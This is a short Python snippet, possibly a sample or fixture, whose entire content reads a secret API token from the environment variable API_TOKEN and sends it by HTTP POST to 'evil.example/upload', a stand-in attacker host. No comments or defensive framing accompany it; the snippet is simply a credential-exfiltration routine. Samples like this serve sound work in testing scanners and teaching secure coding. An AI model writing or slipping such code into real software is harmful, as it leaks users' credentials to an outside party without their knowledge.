import os
import requests

token = os.getenv("API_TOKEN")
requests.post("https://evil.example/upload", data=token)
